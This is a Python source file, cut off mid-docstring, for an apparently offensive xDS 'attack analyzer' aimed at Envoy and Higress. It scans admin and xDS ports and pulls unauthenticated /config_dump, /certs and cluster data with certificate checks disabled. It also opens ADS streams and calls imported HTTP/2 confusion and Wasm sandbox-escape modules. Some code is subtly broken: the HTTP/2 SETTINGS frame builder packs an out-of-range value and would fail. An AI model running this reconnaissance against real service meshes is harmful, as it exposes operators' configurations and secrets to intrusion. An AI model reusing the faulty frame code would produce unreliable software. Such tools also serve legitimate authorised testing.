"""
xDS Protocol Analyzer
针对Envoy、Higress等使用xDS协议的小模块
"""

import asyncio
import socket
import ssl
import time
import json
import struct
import hashlib
from typing import Dict, List, Optional, Tuple, Any
from collections import deque
import random

# Optional gRPC/Proto imports for ADS (real implementation path)
try:
    import grpc  # type: ignore
    import grpc.aio as grpc_aio  # type: ignore
    from google.protobuf import any_pb2  # type: ignore
    from google.protobuf import json_format  # type: ignore
    GRPC_AVAILABLE = True
except Exception:
    GRPC_AVAILABLE = False

# Optional hyper-h2 for RawH2Transport
try:
    import h2.connection  # type: ignore
    import h2.events  # type: ignore
    H2_AVAILABLE = True
except Exception:
    H2_AVAILABLE = False
 
# Try multiple proto import patterns for Envoy v3 xDS
ads_pb2_grpc = None
discovery_pb2 = None
for modpath in [
    ('envoy.service.discovery.v3', 'ads_pb2_grpc', 'discovery_pb2'),
    ('xds.service.discovery.v3', 'aggregated_discovery_service_pb2_grpc', 'discovery_pb2'),
    ('envoy_service_discovery_v3', 'ads_pb2_grpc', 'discovery_pb2'),
]:
    try:
        pkg, ads_name, disc_name = modpath
        ads_pb2_grpc = __import__(f"{pkg}.{ads_name}", fromlist=['*'])
        discovery_pb2 = __import__(f"{pkg}.{disc_name}", fromlist=['*'])
        break
    except Exception:
        continue

# Wasm深度分析集成
try:
    from .wasm_runtime_analyzer import WasmRuntimeAnalyzer
    WASM_ANALYZER_AVAILABLE = True
except ImportError:
    try:
        from wasm_runtime_analyzer import WasmRuntimeAnalyzer
        WASM_ANALYZER_AVAILABLE = True
    except ImportError:
        WasmRuntimeAnalyzer = None
        WASM_ANALYZER_AVAILABLE = False


class XDSProtocolAnalyzer:
    """
    xDS协议攻击分析器
    
    专门分析xDS (x Discovery Service) 协议的安全性：
    1. 配置下发流量分析
    2. 控制面通信窃听
    3. 配置污染和篡改攻击
    4. gRPC over HTTP/2 攻击面
    """

    # 标准 xDS v3 TypeURLs（用于 ADS 订阅/识别）
    TYPE_URLS = {
        'LDS': 'type.googleapis.com/envoy.config.listener.v3.Listener',
        'CDS': 'type.googleapis.com/envoy.config.cluster.v3.Cluster',
        'RDS': 'type.googleapis.com/envoy.config.route.v3.RouteConfiguration',
        'EDS': 'type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment',
        'SDS': 'type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.Secret',
        # Wasm 不是通过 xDS 的顶层资源直接下发，但可用于识别 typed_config
        'WASM': 'type.googleapis.com/envoy.extensions.filters.http.wasm.v3.Wasm',
    }

    # 事件回调（由 Orchestrator 注入），用于高价值目标/插件发现等
    def set_event_callback(self, cb):
        self._event_cb = cb
    def emit_event(self, name: str, payload: Dict[str, Any]):
        try:
            if hasattr(self, '_event_cb') and callable(self._event_cb):
                self._event_cb(name, payload)
        except Exception:
            pass
    
    def __init__(self, target_host: str, target_port: int = 15000, timeout: float = 5.0):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        
        # xDS常见端口
        self.xds_ports = [15000, 15001, 9901, 19000, 8080, 8001]
        
        # SSL上下文
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # 攻击历史记录
        self.attack_history = deque(maxlen=100)
        
        # Wasm分析结果存储
        self.wasm_analysis = None
        
    async def comprehensive_xds_analysis(self) -> Dict:
        """执行全面的xDS协议安全分析"""
        
        print(f"[*] Starting comprehensive xDS protocol security analysis...")
        
        analysis_results = {
            'discovery_results': {},
            'communication_analysis': {},
            'vulnerability_assessment': {},
            'attack_scenarios': {},
            'security_recommendations': []
        }
        
        try:
            # 1. xDS服务发现和端点识别
            print(f"[*] Phase 1: xDS Service Discovery...")
            discovery_results = await self._discover_xds_services()
            analysis_results['discovery_results'] = discovery_results
            
            # 2. 通信协议分析
            print(f"[*] Phase 2: Protocol Communication Analysis...")
            communication_analysis = await self._analyze_xds_communication()
            analysis_results['communication_analysis'] = communication_analysis
            
            # Phase 2 摘要
            protocol_found = len(communication_analysis.get('discovered_services', []))
            version_detected = communication_analysis.get('protocol_version', 'Unknown')
            print(f"[+] Phase 2 results: {protocol_found} protocols found, version: {version_detected}")
            
            # 3. 配置操作漏洞评估
            print(f"[*] Phase 3: Configuration Vulnerability Assessment...")
            vuln_assessment = await self._assess_configuration_vulnerabilities()
            analysis_results['vulnerability_assessment'] = vuln_assessment
            
            # Phase 3 摘要
            vulns_found = len(vuln_assessment.get('vulnerabilities_found', []))
            severity = vuln_assessment.get('max_severity', 'None')
            print(f"[+] Phase 3 results: {vulns_found} vulnerabilities found, max severity: {severity}")
            
            # 4. 高级攻击场景测试
            print(f"[*] Phase 4: Advanced Attack Scenario Testing...")
            attack_scenarios = await self._test_advanced_attack_scenarios()
            analysis_results['attack_scenarios'] = attack_scenarios
            
            # Phase 4 摘要
            exploitable = len([s for s in attack_scenarios.get('scenarios_tested', []) if s.get('exploitable', False)])
            total_scenarios = len(attack_scenarios.get('scenarios_tested', []))
            print(f"[+] Phase 4 results: {exploitable}/{total_scenarios} attack scenarios exploitable")
            
            # 5. 生成安全建议
            security_recommendations = self._generate_security_recommendations(analysis_results)
            analysis_results['security_recommendations'] = security_recommendations
            
            # 6. 综合风险评估
            risk_assessment = self._calculate_risk_assessment(analysis_results)
            analysis_results['risk_assessment'] = risk_assessment
            
            # 最终摘要
            final_risk = risk_assessment.get('risk_level', 'Unknown')
            final_score = risk_assessment.get('security_score', 0)
            print(f"[+] Analysis complete: Risk level {final_risk}, Security score {final_score}/100")
            
            return analysis_results
            
        except Exception as e:
            return {
                'error': f"xDS analysis failed: {e}",
                'partial_results': analysis_results
            }
    
    async def _discover_xds_services(self) -> Dict:
        """发现xDS服务和端点"""
        
        discovered_services = {
            'active_endpoints': [],
            'service_types': [],
            'authentication_required': [],
            'accessible_interfaces': []
        }
        
        # 先进行多策略发现，避免重复探测
        try:
            discovery_hint = await self.discover_xds_endpoints()
            if discovery_hint.get('ports_open'):
                # 优先使用真正打开的端口
                port_list = discovery_hint['ports_open']
            else:
                port_list = self.xds_ports
        except Exception:
            port_list = self.xds_ports

        for port in port_list:
            try:
                print(f"[*] Probing xDS port: {port}")

                # 优先使用 ALPN 检测 HTTP/2（复用现有 h2_cfs 能力）
                alpn = await self._alpn_h2_check(port)

                # 测试gRPC连接（HTTP/2基础之上）
                grpc_result = await self._test_grpc_xds_connection(port)
                if grpc_result.get('accessible') or alpn.get('h2', False):
                    print(f"    Port {port}: xDS gRPC candidate FOUND")
                    discovered_services['active_endpoints'].append({
                        'port': port,
                        'type': 'grpc',
                        'details': {**grpc_result, 'alpn': alpn}
                    })

                # 测试HTTP admin接口
                admin_result = await self._test_admin_interface(port)
                if admin_result['accessible']:
                    print(f"    Port {port}: Admin interface FOUND")
                    discovered_services['accessible_interfaces'].append({
                        'port': port,
                        'type': 'admin',
                        'details': admin_result
                    })

                # 如果都没找到，显示为关闭
                if not (grpc_result.get('accessible') or alpn.get('h2', False)) and not admin_result['accessible']:
                    print(f"    Port {port}: CLOSED/FILTERED")

                # 检测认证要求
                auth_result = await self._test_authentication_requirements(port)
                if auth_result['auth_detected']:
                    discovered_services['authentication_required'].append({
                        'port': port,
                        'auth_type': auth_result['auth_type'],
                        'details': auth_result
                    })

            except Exception:
                print(f"    Port {port}: CLOSED/FILTERED")
                continue

        # 端口探测结果摘要
        active_count = len(discovered_services['active_endpoints'])
        admin_count = len(discovered_services['accessible_interfaces'])
        auth_count = len(discovered_services['authentication_required'])
        
        print(f"[+] Port scan results: {active_count} xDS services, {admin_count} admin interfaces, {auth_count} auth-protected")
        
        # 分析发现的服务类型
        discovered_services['service_types'] = self._classify_discovered_services(discovered_services)
        
        return discovered_services
    
    async def _test_grpc_xds_connection(self, port: int) -> Dict:
        """测试gRPC xDS连接"""
        
        try:
            # 建立TCP连接
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, port),
                timeout=self.timeout
            )
            
            # HTTP/2连接前奏 (gRPC over HTTP/2)
            http2_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
            writer.write(http2_preface)
            await writer.drain()
            
            # HTTP/2 SETTINGS帧
            settings_frame = self._build_http2_settings_frame()
            writer.write(settings_frame)
            await writer.drain()
            
            # 读取响应
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            
            writer.close()
            await writer.wait_closed()
            
            # 分析响应
            is_http2_response = len(response) >= 9 and self._is_valid_http2_frame(response)
            
            if is_http2_response:
                frame_analysis = self._analyze_http2_frames(response)
                
                # 事件：发现弱TLS配置（明文gRPC连接）
                self.emit_event('WeakTLSConfig', {
                    'type': 'plaintext_grpc',
                    'port': port,
                    'severity': 'MEDIUM',
                    'details': 'gRPC over plaintext HTTP/2 detected'
                })
                
                return {
                    'accessible': True,
                    'protocol': 'HTTP/2',
                    'frame_analysis': frame_analysis,
                    'likely_grpc': True,
                    'response_length': len(response)
                }
            else:
                return {
                    'accessible': False,
                    'protocol': 'Unknown',
                    'response_data': response[:100].hex() if response else '',
                    'likely_grpc': False
                }
                
        except Exception as e:
            return {
                'accessible': False,
                'error': str(e),
                'likely_grpc': False
            }
    
    def _build_http2_settings_frame(self) -> bytes:
        """构建HTTP/2 SETTINGS帧"""
        
        # SETTINGS帧格式: 9字节帧头 + 设置项
        # 帧头: Length(3) + Type(1) + Flags(1) + Stream ID(4)
        
        # 常见设置项
        settings = [
            (0x1, 4096),    # SETTINGS_HEADER_TABLE_SIZE
            (0x2, 0),       # SETTINGS_ENABLE_PUSH (disabled)
            (0x3, 100),     # SETTINGS_MAX_CONCURRENT_STREAMS
            (0x4, 65535),   # SETTINGS_INITIAL_WINDOW_SIZE
        ]
        
        # 构建设置项数据
        settings_data = b""
        for setting_id, value in settings:
            settings_data += struct.pack(">HI", setting_id, value)
        
        # 构建帧头
        length = len(settings_data)
        frame_header = struct.pack(">IHBBBI", 
                                   length >> 8,  # Length高位
                                   (length & 0xFF) << 24,  # Length低位
                                   0x04,  # Type = SETTINGS
                                   0x00,  # Flags
                                   0x00,  # Stream ID
                                   0x00)  # Stream ID继续
        
        return frame_header[0:3] + frame_header[4:5] + frame_header[5:6] + frame_header[6:10] + settings_data
    
    def _is_valid_http2_frame(self, data: bytes) -> bool:
        """检查是否为有效的HTTP/2帧"""
        
        if len(data) < 9:
            return False
        
        # 解析帧头
        length = (data[0] << 16) | (data[1] << 8) | data[2]
        frame_type = data[3]
        flags = data[4]
        stream_id = struct.unpack(">I", data[5:9])[0] & 0x7FFFFFFF
        
        # 检查合理性
        if length > 16384:  # 最大帧大小
            return False
        
        if frame_type > 10:  # 已知帧类型范围
            return False
        
        return True
    
    def _analyze_http2_frames(self, data: bytes) -> Dict:
        """分析HTTP/2帧"""
        frames = []
        offset = 0
        while offset + 9 <= len(data):
            length = (data[offset] << 16) | (data[offset + 1] << 8) | data[offset + 2]
            frame_type = data[offset + 3]
            flags = data[offset + 4]
            stream_id = struct.unpack(">I", data[offset + 5:offset + 9])[0] & 0x7FFFFFFF
            frame_info = {
                'type': frame_type,
                'length': length,
                'flags': flags,
                'stream_id': stream_id,
                'offset': offset
            }
            frame_types = {0:'DATA',1:'HEADERS',2:'PRIORITY',3:'RST_STREAM',4:'SETTINGS',5:'PUSH_PROMISE',6:'PING',7:'GOAWAY',8:'WINDOW_UPDATE',9:'CONTINUATION'}
            frame_info['type_name'] = frame_types.get(frame_type, f'UNKNOWN({frame_type})')
            frames.append(frame_info)
            offset += 9 + length
            if offset >= len(data):
                break
        return {
            'total_frames': len(frames),
            'frames': frames,
            'has_settings': any(f['type'] == 4 for f in frames),
            'has_headers': any(f['type'] == 1 for f in frames)
        }

    async def _alpn_h2_check(self, port: int) -> Dict:
        """复用已有 h2_cfs 能力：用 ALPN 检测 HTTP/2 支持。若不可用，回退到本地握手。"""
        try:
            try:
                from .h2_cfs import H2ContinuationConfusion  # type: ignore
            except ImportError:
                from h2_cfs import H2ContinuationConfusion  # type: ignore
            attacker = H2ContinuationConfusion(self.target_host, port, timeout=3.0)
            res = await attacker.test_h2_connectivity()
            return {'h2': bool(res.get('supported')), 'alpn': res.get('alpn_negotiated'), 'details': res}
        except Exception:
            # 回退到最小H2握手
            h2 = await self.h2_client_handshake(port)
            return {'h2': h2.get('ok', False), 'details': h2}
    
    async def _test_admin_interface(self, port: int) -> Dict:
        """测试管理接口访问"""
        
        admin_endpoints = [
            '/config_dump', '/stats', '/clusters', '/listeners', 
            '/runtime', '/certs', '/memory', '/server_info'
        ]
        
        accessible_endpoints = []
        
        for endpoint in admin_endpoints:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, port),
                    timeout=self.timeout
                )
                
                request = (
                    f"GET {endpoint} HTTP/1.1\r\n"
                    f"Host: {self.target_host}:{port}\r\n"
                    f"User-Agent: xDS-Analyzer/1.0\r\n"
                    f"Connection: close\r\n\r\n"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(2048), timeout=3.0)
                response_text = response.decode('utf-8', errors='ignore')
                
                writer.close()
                await writer.wait_closed()
                
                # 分析响应
                if '200 OK' in response_text:
                    accessible_endpoints.append({
                        'endpoint': endpoint,
                        'status': '200 OK',
                        'content_preview': response_text[:500],
                        'contains_config': 'config' in response_text.lower() or 'cluster' in response_text.lower()
                    })
                elif '401' in response_text or '403' in response_text:
                    accessible_endpoints.append({
                        'endpoint': endpoint,
                        'status': 'Protected',
                        'auth_required': True
                    })
                    
            except Exception:
                continue
        
        return {
            'accessible': len(accessible_endpoints) > 0,
            'endpoints': accessible_endpoints,
            'config_accessible': any(ep.get('contains_config', False) for ep in accessible_endpoints),
            'count': len(accessible_endpoints)
        }
    
    async def _test_authentication_requirements(self, port: int) -> Dict:
        """测试认证要求"""
        
        try:
            # 发送无认证请求
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, port),
                timeout=self.timeout
            )
            
            request = (
                f"GET /config_dump HTTP/1.1\r\n"
                f"Host: {self.target_host}:{port}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            writer.close()
            await writer.wait_closed()
            
            # 分析认证需求
            auth_detected = False
            auth_type = "None"
            
            if '401' in response_text:
                auth_detected = True
                if 'Basic' in response_text:
                    auth_type = "Basic"
                elif 'Bearer' in response_text:
                    auth_type = "Bearer"
                else:
                    auth_type = "Unknown"
            elif '403' in response_text:
                auth_detected = True
                auth_type = "Authorization"
            
            return {
                'auth_detected': auth_detected,
                'auth_type': auth_type,
                'response_status': response_text.split('\r\n')[0] if response_text else '',
                'headers': self._extract_auth_headers(response_text)
            }
            
        except Exception as e:
            return {
                'auth_detected': False,
                'auth_type': "Unknown",
                'error': str(e)
            }
    
    def _extract_auth_headers(self, response: str) -> List[str]:
        """提取认证相关头部"""
        
        auth_headers = []
        lines = response.split('\r\n')
        
        for line in lines:
            if ':' in line:
                header_name = line.split(':')[0].lower()
                if 'auth' in header_name or 'www-authenticate' in header_name:
                    auth_headers.append(line.strip())
        
        return auth_headers
    
    def _classify_discovered_services(self, discovery_results: Dict) -> List[str]:
        """分类发现的服务类型"""
        
        service_types = []
        
        # 基于端口和功能推断服务类型
        active_endpoints = discovery_results.get('active_endpoints', [])
        accessible_interfaces = discovery_results.get('accessible_interfaces', [])
        
        # 检查Envoy特征
        if any(ep['port'] in [15000, 15001] for ep in active_endpoints):
            service_types.append('Envoy_Proxy')
        
        # 检查管理接口
        if accessible_interfaces:
            service_types.append('Admin_Interface')
        
        # 检查gRPC服务
        if any(ep.get('details', {}).get('likely_grpc', False) for ep in active_endpoints):
            service_types.append('gRPC_xDS')
        
        # 检查认证服务
        if discovery_results.get('authentication_required'):
            service_types.append('Authenticated_Service')
        
        return service_types if service_types else ['Unknown_Service']
    
    async def _analyze_xds_communication(self) -> Dict:
        """分析xDS通信模式"""
        
        communication_analysis = {
            'protocol_versions': [],
            'streaming_behavior': {},
            'configuration_types': [],
            'update_patterns': {},
            'ads_session': {}
        }
        
        try:
            # 1. 协议版本检测
            print(f"[*] Detecting xDS protocol versions...")
            protocol_versions = await self._detect_xds_protocol_versions()
            communication_analysis['protocol_versions'] = protocol_versions
            
            # 2. 流式通信行为分析
            print(f"[*] Analyzing streaming communication...")
            streaming_behavior = await self._analyze_streaming_behavior()
            communication_analysis['streaming_behavior'] = streaming_behavior
            
            # 3. 配置类型识别
            print(f"[*] Identifying configuration types...")
            config_types = await self._identify_configuration_types()
            communication_analysis['configuration_types'] = config_types
            
            # 4. 更新模式分析
            print(f"[*] Analyzing update patterns...")
            update_patterns = await self._analyze_update_patterns()
            communication_analysis['update_patterns'] = update_patterns

            # 5. 建立真实 ADS 会话：优先 gRPC；失败或不可用则 RawH2
            if GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2:
                print(f"[*] Establishing ADS gRPC stream...")
                try:
                    session = await self.connect_ads_stream(type_urls=[self.TYPE_URLS['LDS'], self.TYPE_URLS['CDS']])
                    communication_analysis['ads_session'] = session
                except Exception as e:
                    # 回退到最小可用 gRPC 或 RawH2
                    try:
                        session = await self._run_ads_best_effort()
                        communication_analysis['ads_session'] = session
                    except Exception as e2:
                        if H2_AVAILABLE:
                            session = await self._run_ads_raw_best_effort([self.TYPE_URLS['LDS']])
                            communication_analysis['ads_session'] = session
                        else:
                            communication_analysis['ads_session'] = {'status': 'ERROR', 'error': f"connect/backup failed: {e} | {e2}"}
            else:
                if H2_AVAILABLE:
                    communication_analysis['ads_session'] = await self._run_ads_raw_best_effort([self.TYPE_URLS['LDS']])
                else:
                    communication_analysis['ads_session'] = {'status': 'SKIPPED', 'reason': 'gRPC/protobuf not available and no hyper-h2'}
            
        except Exception as e:
            communication_analysis['error'] = str(e)
        
        return communication_analysis
    
    async def _detect_xds_protocol_versions(self) -> Dict:
        """检测xDS协议版本"""
        
        version_tests = {
            'v2_detected': False,
            'v3_detected': False,
            'version_evidence': []
        }
        
        # 检测v2和v3 API路径
        v2_paths = [
            '/v2/discovery:clusters',
            '/v2/discovery:listeners',
            '/v2/discovery:routes'
        ]
        
        v3_paths = [
            '/v3/discovery:clusters', 
            '/v3/discovery:listeners',
            '/v3/discovery:routes'
        ]
        
        for port in [15000, 15001]:
            try:
                # 测试v2 API
                for path in v2_paths[:2]:  # 限制测试数量
                    result = await self._test_xds_api_path(port, path)
                    if result['accessible']:
                        version_tests['v2_detected'] = True
                        version_tests['version_evidence'].append(f"v2 API accessible: {path}")
                
                # 测试v3 API
                for path in v3_paths[:2]:  # 限制测试数量
                    result = await self._test_xds_api_path(port, path)
                    if result['accessible']:
                        version_tests['v3_detected'] = True
                        version_tests['version_evidence'].append(f"v3 API accessible: {path}")
                        
            except Exception:
                continue
        
        return version_tests
    
    async def _test_xds_api_path(self, port: int, path: str) -> Dict:
        """替换：优先用真实 gRPC 探测，HTTP路径仅作为回退。"""
        # 1) 优先尝试建立短时 ADS 流（1.5s）
        if GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2:
            try:
                session = await self.connect_ads_stream(type_urls=[self.TYPE_URLS['LDS']], duration_sec=1.5)
                if session.get('status') == 'OK':
                    return {
                        'accessible': True,
                        'response_preview': f"ads_ok types={session.get('types')} msgs={session.get('message_count')}",
                        'status': 'gRPC-OK'
                    }
            except Exception:
                pass
        # 2) 回退到历史HTTP探测（尽量保留兼容）
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, port),
                timeout=self.timeout
            )
            request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {self.target_host}:{port}\r\n"
                f"Content-Type: application/grpc+proto\r\n"
                f"Content-Length: 0\r\n"
                f"Connection: close\r\n\r\n"
            )
            writer.write(request.encode()); await writer.drain()
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            response_text = response.decode('utf-8', errors='ignore')
            writer.close(); await writer.wait_closed()
            accessible = '200 OK' in response_text or 'grpc' in response_text.lower()
            return {
                'accessible': accessible,
                'response_preview': response_text[:200],
                'status': response_text.split('\r\n')[0] if response_text else ''
            }
        except Exception as e:
            return {'accessible': False, 'error': str(e)}
    
    async def _analyze_streaming_behavior(self) -> Dict:
        """分析流式通信行为"""
        
        streaming_analysis = {
            'bidirectional_streams': False,
            'keep_alive_detected': False,
            'stream_multiplexing': False,
            'connection_patterns': []
        }
        
        try:
            # 建立多个连接观察行为
            connection_tests = []
            
            for i in range(3):
                conn_test = await self._test_streaming_connection()
                if conn_test:
                    connection_tests.append(conn_test)
                await asyncio.sleep(0.5)
            
            if connection_tests:
                # 分析连接模式
                avg_duration = sum(test['duration'] for test in connection_tests) / len(connection_tests)
                streaming_analysis['connection_patterns'] = connection_tests
                streaming_analysis['average_duration'] = avg_duration
                
                # 检测保持连接特征
                long_connections = [test for test in connection_tests if test['duration'] > 1.0]
                streaming_analysis['keep_alive_detected'] = len(long_connections) > 0
                
        except Exception as e:
            streaming_analysis['error'] = str(e)
        
        return streaming_analysis
    
    async def _test_streaming_connection(self) -> Optional[Dict]:
        """测试流式连接特征"""
        
        try:
            start_time = time.perf_counter()
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, 15000),
                timeout=self.timeout
            )
            
            # 发送HTTP/2连接
            http2_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
            writer.write(http2_preface)
            await writer.drain()
            
            # 等待一段时间观察连接行为
            await asyncio.sleep(1.0)
            
            writer.close()
            await writer.wait_closed()
            
            duration = time.perf_counter() - start_time
            
            return {
                'duration': duration,
                'successful': True,
                'timestamp': time.time()
            }
            
        except Exception:
            return None
    
    async def _identify_configuration_types(self) -> List[str]:
        """识别配置类型"""
        
        config_types = []
        
        # 通过admin接口检查配置类型
        for port in [15000, 15001]:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, port),
                    timeout=self.timeout
                )
                
                request = (
                    f"GET /config_dump HTTP/1.1\r\n"
                    f"Host: {self.target_host}:{port}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                response_text = response.decode('utf-8', errors='ignore')
                
                writer.close()
                await writer.wait_closed()
                
                # 检查配置类型关键字
                config_keywords = {
                    'clusters': 'CDS',
                    'listeners': 'LDS', 
                    'routes': 'RDS',
                    'endpoints': 'EDS',
                    'secrets': 'SDS'
                }
                
                for keyword, config_type in config_keywords.items():
                    if keyword in response_text.lower():
                        config_types.append(config_type)
                
                # 核心增强：Wasm插件识别
                wasm_detection = await self._detect_wasm_plugins(response_text)
                if wasm_detection['wasm_detected']:
                    config_types.append('WASM_PLUGINS')
                    # 存储Wasm分析结果供后续使用
                    self.wasm_analysis = wasm_detection
                
                break  # 成功获取配置后退出
                
            except Exception:
                continue
        
        return list(set(config_types))  # 去重
    
    async def _detect_wasm_plugins(self, config_text: str) -> Dict:
        """核心方法：检测Wasm插件攻击面"""
        
        wasm_detection = {
            'wasm_detected': False,
            'plugin_count': 0,
            'wasm_filters': [],
            'wasm_sources': [],
            'plugin_configurations': [],
            'attack_surface_analysis': {}
        }
        
        try:
            import re
            
            # 1. 核心特征：检测 envoy.filters.http.wasm
            wasm_filter_pattern = r'envoy\.filters\.http\.wasm'
            wasm_matches = re.findall(wasm_filter_pattern, config_text, re.IGNORECASE)
            
            if wasm_matches:
                wasm_detection['wasm_detected'] = True
                wasm_detection['plugin_count'] = len(wasm_matches)
                print(f"[+] WASM PLUGINS DETECTED: {len(wasm_matches)} instances")
            
            # 2. 提取Wasm模块源
            wasm_sources = self._extract_wasm_sources(config_text)
            wasm_detection['wasm_sources'] = wasm_sources
            
            # 3. 提取插件配置
            plugin_configs = self._extract_wasm_configurations(config_text)
            wasm_detection['plugin_configurations'] = plugin_configs
            
            # 4. 攻击面分析
            if wasm_detection['wasm_detected']:
                attack_surface = self._analyze_wasm_attack_surface(wasm_sources, plugin_configs)
                wasm_detection['attack_surface_analysis'] = attack_surface
                
                print(f"[!] Wasm Attack Surface Analysis:")
                print(f"    - Module Sources: {len(wasm_sources)}")
                print(f"    - Plugin Configs: {len(plugin_configs)}")
                print(f"    - Risk Level: {attack_surface.get('risk_level', 'Unknown')}")
                
                # 5. 自动触发深度Wasm运行时安全分析
                if WASM_ANALYZER_AVAILABLE:
                    print(f"[*] Triggering comprehensive Wasm runtime security analysis...")
                    deep_analysis = await self._execute_deep_wasm_analysis()
                    if deep_analysis:
                        wasm_detection['deep_runtime_analysis'] = deep_analysis
                        print(f"[+] Deep analysis completed - Security Score: {deep_analysis.get('security_score', 'N/A')}")
                else:
                    print(f"[!] Deep Wasm analyzer not available - install wasm_runtime_analyzer.py for full capability")
            
        except Exception as e:
            wasm_detection['error'] = str(e)
        
        return wasm_detection
    
    async def _execute_deep_wasm_analysis(self) -> Optional[Dict]:
        """执行深度Wasm运行时安全分析"""
        
        if not WASM_ANALYZER_AVAILABLE:
            return None
        
        try:
            # 创建Wasm运行时分析器实例
            wasm_analyzer = WasmRuntimeAnalyzer(
                target_host=self.target_host,
                target_port=self.target_port if hasattr(self, 'target_port') else 80,
                timeout=self.timeout
            )
            
            # 执行全面的Wasm安全分析
            print(f"[*] Executing comprehensive Wasm runtime security analysis...")
            deep_results = await wasm_analyzer.comprehensive_wasm_security_analysis()
            
            if 'error' in deep_results:
                print(f"[-] Deep Wasm analysis failed: {deep_results['error']}")
                return None
            
            # 提取关键结果用于集成
            integrated_results = {
                'runtime_detected': deep_results.get('runtime_detection', {}).get('wasm_detected', False),
                'runtime_type': deep_results.get('runtime_detection', {}).get('runtime_type', 'Unknown'),
                'confidence_score': deep_results.get('runtime_detection', {}).get('confidence_score', 0),
                'plugins_discovered': len(deep_results.get('plugin_analysis', {}).get('plugin_discovery', {}).get('discovered_plugins', [])),
                'sandbox_escapes': deep_results.get('sandbox_security', {}).get('sandbox_escape_attempts', {}).get('successful_escapes', 0),
                'memory_vulnerabilities': self._extract_memory_vulns(deep_results.get('memory_safety', {})),
                'security_score': deep_results.get('overall_assessment', {}).get('security_score', 0),
                'risk_level': deep_results.get('overall_assessment', {}).get('risk_level', 'Unknown'),
                'critical_vulnerabilities': deep_results.get('overall_assessment', {}).get('critical_vulnerabilities', []),
                'attack_vectors': deep_results.get('overall_assessment', {}).get('attack_vectors', []),
                'raw_results': deep_results  # 保留原始结果
            }
            
            return integrated_results
            
        except Exception as e:
            print(f"[-] Deep Wasm analysis execution failed: {e}")
            return None
    
    def _extract_memory_vulns(self, memory_safety: Dict) -> Dict:
        """提取内存安全漏洞信息"""
        
        vulns = {
            'buffer_overflow_protection': 'Unknown',
            'use_after_free_detected': False,
            'double_free_detected': False,
            'memory_leaks_suspected': False
        }
        
        try:
            buffer_protection = memory_safety.get('buffer_overflow_protection', {})
            vulns['buffer_overflow_protection'] = buffer_protection.get('protection_level', 'Unknown')
            
            uaf_detection = memory_safety.get('use_after_free_detection', {})
            vulns['use_after_free_detected'] = uaf_detection.get('uaf_detection_active', False)
            
            double_free = memory_safety.get('double_free_detection', {})
            vulns['double_free_detected'] = double_free.get('double_free_detection_active', False)
            
            leak_assessment = memory_safety.get('memory_leak_assessment', {})
            vulns['memory_leaks_suspected'] = leak_assessment.get('memory_leak_suspected', False)
            
        except Exception:
            pass
        
        return vulns

    # ------------------- ADS/gRPC 全功能实现（新增） -------------------
    async def tls_mtls_setup(self, use_tls: bool = False,
                             ca_cert: Optional[bytes | str] = None,
                             client_cert: Optional[bytes | str] = None,
                             client_key: Optional[bytes | str] = None,
                             server_name: Optional[str] = None,
                             keepalive_ms: int = 30000) -> Tuple[Any, str]:
        """构建 gRPC Channel（支持 TLS/mTLS）。返回 (channel, target)。
        - ca_cert/client_cert/client_key 可为 bytes 或 文件路径字符串。
        - 默认不校验证书（由上层控制安全策略）。
        """
        if not GRPC_AVAILABLE:
            raise RuntimeError('grpc/protobuf not available')

        # 选择可用端口
        port = next((p for p in self.xds_ports if await self._port_open(p)), None)
        if port is None:
            raise RuntimeError('no xDS port open')
        target = f"{self.target_host}:{port}"

        options = [
            ('grpc.max_receive_message_length', 32 * 1024 * 1024),
            ('grpc.keepalive_time_ms', keepalive_ms),
            ('grpc.keepalive_timeout_ms', 10000),
            ('grpc.keepalive_permit_without_calls', 1),
        ]

        if not use_tls:
            channel = grpc_aio.insecure_channel(target, options=options)
            return channel, target

        def _maybe_read(x: Optional[bytes | str]) -> Optional[bytes]:
            if x is None:
                return None
            if isinstance(x, bytes):
                return x
            try:
                with open(x, 'rb') as f:
                    return f.read()
            except Exception:
                # 当作原始 bytes 字符串内容（例如 PEM 文本）
                return x.encode('utf-8')

        root = _maybe_read(ca_cert)
        cert = _maybe_read(client_cert)
        key = _maybe_read(client_key)

        creds = grpc.ssl_channel_credentials(root_certificates=root,
                                             private_key=key,
                                             certificate_chain=cert)
        if server_name:
            options.append(('grpc.ssl_target_name_override', server_name))

        channel = grpc_aio.secure_channel(target, creds, options=options)
        return channel, target

    async def connect_ads_stream(self,
                                 type_urls: Optional[List[str]] = None,
                                 resource_names: Optional[Dict[str, List[str]]] = None,
                                 use_tls: bool = False,
                                 ca_cert: Optional[bytes | str] = None,
                                 client_cert: Optional[bytes | str] = None,
                                 client_key: Optional[bytes | str] = None,
                                 server_name: Optional[str] = None,
                                 duration_sec: float = 8.0) -> Dict:
        """建立 ADS 流，真实订阅 + ACK/NACK 循环，返回更新快照。
        - type_urls: 要订阅的 TypeURLs 列表（默认订阅 LDS/CDS）。
        - resource_names: 指定每个 TypeURL 订阅的具体资源名。
        - duration_sec: 采样时长，默认 8 秒。
